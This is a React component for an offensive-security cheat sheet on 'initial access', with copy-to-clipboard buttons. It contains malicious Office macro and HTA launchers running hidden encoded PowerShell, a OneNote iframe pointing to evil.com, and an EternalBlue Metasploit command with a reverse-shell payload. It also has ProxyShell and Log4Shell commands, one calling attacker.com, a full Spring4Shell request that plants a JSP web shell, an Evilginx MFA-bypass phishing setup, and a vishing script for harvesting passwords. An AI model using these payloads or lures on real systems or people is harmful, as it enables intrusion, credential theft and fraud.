import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaUserSecret, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const InitialAccessTechniques = () => {
  const [expandedSection, setExpandedSection] = useState('phishing');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'walkthrough',
      title: 'Guided Initial Access Walkthrough',
      content: [
        {
          type: 'markdown',
          value: 'Follow this step-by-step chain for initial access. Expand each step for details and commands.'
        },
        {
          type: 'step',
          title: '1. Phishing & Malicious Documents',
          description: 'Craft and deliver phishing payloads to the target.',
          commands: [
            { value: 'Sub AutoOpen() ...', description: 'Malicious Office macro (VBA)' },
            { value: '<script> ... </script>', description: 'Malicious HTA file' },
            { value: 'OneNote payload (PowerShell/iframe)', description: 'Malicious OneNote file' }
          ]
        },
        {
          type: 'step',
          title: '2. Exploiting Services',
          description: 'Exploit exposed services and known vulnerabilities.',
          commands: [
            { value: 'hydra -L users.txt -P passwords.txt ssh://target.com', description: 'SSH password spraying' },
            { value: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target.com; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit"', description: 'SMB exploitation (EternalBlue)' },
            { value: 'python3 proxyshell.py -t https://exchange.target.com -u admin@target.com', description: 'ProxyShell exploit' }
          ]
        },
        {
          type: 'step',
          title: '3. Social Engineering',
          description: 'Leverage social engineering to gain access.',
          commands: [
            { value: 'Pretexting: IT support scenario', description: 'Impersonate IT to collect credentials' },
            { value: 'Baiting: USB drop', description: 'Drop malicious USBs in target environment' },
            { value: 'Vishing: "Hello, this is John from IT..."', description: 'Phone-based credential harvesting' }
          ]
        },
        {
          type: 'markdown',
          value: '**Tip:** After each step, validate access and document your findings!'
        }
      ]
    },
    {
      id: 'phishing',
      title: 'Phishing Payloads',
      content: [
        {
          type: 'markdown',
          value: `### Malicious Documents
\`\`\`vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell -nop -w hidden -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQA...")"
    Shell cmd, vbHide
End Sub
\`\`\``
        },
        {
          type: 'markdown',
          value: `### HTA Files
\`\`\`html
<script>
  var c = "cmd.exe /c powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQA...";
  new ActiveXObject('WScript.Shell').Run(c,0,false);
</script>
\`\`\``
        },
        {
          type: 'markdown',
          value: `### OneNote Payloads
\`\`\`powershell
# Create malicious OneNote file
$note = New-Object -ComObject OneNote.Application
$notebook = $note.OpenHierarchy("C:\\temp\\malicious.onetoc2", "", $null, "")
$page = $note.CreateNewPage($notebook, "Important Notes")
$note.UpdatePageContent($page, "<html><body><iframe src='http://evil.com/exploit.html' width='0' height='0'></iframe></body></html>")
\`\`\``
        }
      ]
    },
    {
      id: 'exploits',
      title: 'Exploiting Services',
      content: [
        {
          type: 'markdown',
          value: `### Common Service Exploits
\`\`\`bash
# SSH password spraying
hydra -L users.txt -P passwords.txt ssh://target.com

# SMB exploitation (EternalBlue)
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS target.com; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit"

# RDP with known credentials
xfreerdp /u:admin /p:password /v:target.com +compression /clipboard
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Recent CVEs
\`\`\`bash
# ProxyShell (CVE-2021-34473, 34523, 31207)
python3 proxyshell.py -t https://exchange.target.com -u admin@target.com

# Log4Shell (CVE-2021-44228)
python3 exploit.py --target http://vulnerable.com --payload '\${jndi:ldap://attacker.com/Exploit}'

# Spring4Shell (CVE-2022-22965)
curl -X POST "http://target.com/path?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
\`\`\``

        }
      ]
    },
    {
      id: 'social',
      title: 'Social Engineering',
      content: [
        {
          type: 'markdown',
          value: `### Common Techniques
\`\`\`markdown
- **Pretexting**: Create a believable scenario
  - IT support needing to "verify credentials"
  - HR conducting a "mandatory security training"

- **Baiting**: 
  - USB drops with "Salary_2023.xlsx.lnk" files
  - Fake software updates ("Adobe_Flash_Update.exe")

- **Vishing Scripts**:
  "Hello, this is John from IT. We're getting alerts that your account may be compromised. 
  Can you verify your username and temporary password so we can secure it?"
\`\`\``
        },
        {
          type: 'markdown',
          value: `### Tools
\`\`\`bash
# GoPhish setup
./gophish
# Access admin interface at https://localhost:3333

# Evilginx2 (MFA bypass)
evilginx -p ./phishlets/ -t o365.yaml -d login.target.com
\`\`\``
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaUserSecret /> Initial Access Techniques
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive guide to gaining initial access through phishing, service exploitation,
          and social engineering. Includes payloads, recent CVEs, and attack methodologies.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => {
                    if (item.type === 'step') {
                      return (
                        <div key={index} className="content-item walkthrough-step">
                          <div className="step-header">
                            <strong>{item.title}</strong>
                          </div>
                          <div className="step-description">{item.description}</div>
                          <div className="step-commands">
                            {item.commands.map((cmd, i) => (
                              <div key={i} className="command-item">
                                <div className="command-header">
                                  <code>{cmd.value}</code>
                                  <button
                                    onClick={() => handleCopy(cmd.value)}
                                    className="copy-button small"
                                  >
                                    Copy
                                  </button>
                                </div>
                                <p className="command-description">{cmd.description}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      );
                    } else if (item.type === 'command') {
                      return (
                        <div key={index} className="content-item">
                          <div className="command-item">
                            <div className="command-header">
                              <code>{item.value}</code>
                              <button
                                onClick={() => handleCopy(item.value)}
                                className="copy-button small"
                              >
                                Copy
                              </button>
                            </div>
                            <p className="command-description">{item.description}</p>
                          </div>
                        </div>
                      );
                    } else {
                      return (
                        <div key={index} className="content-item">
                          <div className="markdown-content">
                            <ReactMarkdown>
                              {item.value}
                            </ReactMarkdown>
                            <button
                              onClick={() => handleCopy(item.value.replace(/```[a-z]*\n/, '').replace(/\n```/, ''))}
                              className="copy-button"
                            >
                              Copy All
                            </button>
                          </div>
                        </div>
                      );
                    }
                  })}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default InitialAccessTechniques;